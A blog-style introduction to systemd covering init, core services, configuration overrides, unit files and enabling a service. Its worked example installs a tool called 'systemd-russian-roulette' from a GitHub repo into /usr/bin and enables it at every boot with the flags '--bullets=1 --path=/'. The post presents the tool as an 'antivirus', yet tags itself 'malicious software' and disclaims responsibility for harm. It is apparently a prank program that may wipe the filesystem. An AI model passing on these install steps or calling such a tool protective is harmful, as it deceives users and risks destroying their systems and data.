---
title: "Systemd Introduction"
date: 2023-08-25T20:08:47Z
draft: false
cover:
  image: /img/systemd-logo.svg
  alt: "Systemd Logo"
  caption: "Systemd Logo"
categories: ["System Administration"]
tags: ["systemd", "malicious software"]
---

In this post, I'll provide a concise introduction to systemd, giving you just enough information to get started without
overwhelming you.

## What is systemd?

systemd is a Linux **system** and **service** manager that serves as the default init system for the majority of Linux
distributions. During system boot, the kernel initiates the "init" process, which is responsible for launching
additional processes and overseeing the overall system management. Additionally, systemd performs various cool
things such as 
[managing orphaned processes and terminating zombie processes](https://stackoverflow.com/questions/20688982/zombie-process-vs-orphan-process).
```
                                                          +-------------------+
                                                          |                   |
                                                          |                   |
                                          +-------------> |       PID 2       |
                                          |               |                   |
                                          |               |                   |
                                          |               +-------------------+
                                          |
+-------------------+           +-------------------+     +-------------------+
|                   |           |                   |     |                   |
|                   |  (loads)  |                   |     |                   |
|      Kernel       | --------> |   Init (PID 1)    | --> |       PID 3       |
|                   |           |                   |     |                   |
|                   |           |                   |     |                   |
+-------------------+           +-------------------+     +-------------------+
                                          |
                                          |               +-------------------+
                                          |               |                   |
                                          |               |                   |
                                          +-------------> |       PID N       |
                                                          |                   |
                                                          |                   |
                                                          +-------------------+
```

Beyond being an init system, systemd offers an array of features, including:
- **systemd-journald** - A system service responsible for gathering and storing logging data.
- **systemd-networkd** - A system service dedicated to network management.
- **systemd-logind** - A system service that handles user logins.

Most features can be accessed and managed through command line tools, D-Bus interfaces, or **configuration files**.


### Configuration files

Usually found in `/etc/systemd/` (which is expected, given that `/etc/` is commonly used for storing configuration files).
If you place some snippets configuration files in other locations (with the location depending on the service), they can
replace settings in the main files. The order these files are parsed determines the overriding, with the snippets
consistently taking precedence over the main configuration file.

Take the example of [resolve.conf](https://www.freedesktop.org/software/systemd/man/resolved.conf.html), you have the following paths:
```
/etc/systemd/resolved.conf.d/*.conf
/run/systemd/resolved.conf.d/*.conf
/usr/lib/systemd/resolved.conf.d/*.conf
```

The choices within each configuration file vary based on the specific target service. To gain a clearer understanding
of what's possible with each service, you should to refer to the dedicated [documentation](https://www.freedesktop.org/software/systemd/man/).

## Custom service

We'll create our own service and utilize systemd to run it upon boot. The service will be named `systemd-russian-roulette.service`,
keep that in mind. However, before we proceed, there are a few concepts we should familiarize ourselves with.

You have two options: you can either go through the [description](https://www.freedesktop.org/software/systemd/man/systemd.unit.html#Description)
or simply tag along with me. The choice is yours!

### Units

A unit in systemd refers to any entity that is managed by the system, such as services, devices, mount points, sockets,
swap files, and more. Each unit finds its definition within a unit file—a configuration file. Unit files can be placed
in different locations, according to the unit's role or originator. You can examine the default paths for user and system
units by referring to the information [here](https://www.freedesktop.org/software/systemd/man/systemd.unit.html#Unit%20File%20Load%20Path). 

Our service `systemd-russian-roulette.service` will reside in the `/etc/systemd/system/` directory. In our context, there's no need for complex configurations.

To begin, let's install the required dependencies for our service:
```bash
# cargo
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
# systemd-russian-roulette
cargo install --git https://github.com/dcavalei/systemd-russian-roulette.git --root /tmp && sudo mv /tmp/bin/systemd-russian-roulette /usr/bin
```

### Enable / Disable services

With the dependencies in place, we're ready to move forward and configure our `systemd-russian-roulette.service`.
```
[Unit]
Description=The systemd russian roulette service.

[Service]
Type=oneshot
RemainAfterExit=true
ExecStart=/usr/bin/systemd-russian-roulette --clip=6 --bullets=1 --path=/

[Install]
WantedBy=multi-user.target
```

With the service installed, the final step is to enable it on the system:
```bash
sudo systemctl enable systemd-russian-roulette
```
Executing this command will generate a symbolic link of our service within the directories designated by the `[Install]`
targets (`multi-user.target`).

Disabling the service is as straightforward as removing the symbolic link, although it's advisable to do it via command-line tool:
```bash
sudo systemctl disable systemd-russian-roulette
```

From this point onward, each time your system boots up, `systemd-russian-roulette.service` will initiate, safeguarding your
system against potential threats posed by malicious users.

I strongly recommend checking the [source code](https://github.com/dcavalei/systemd-russian-roulette/blob/main/src/main.rs).
Be aware that this antivirus is currently undergoing development, so occasional crashes may occur. Please note that any
resulting issues or harm are not under my responsibility.

## Conclusion

Again... I **strongly** recommend checking the [source code](https://github.com/dcavalei/systemd-russian-roulette/blob/main/src/main.rs) before installing this service.
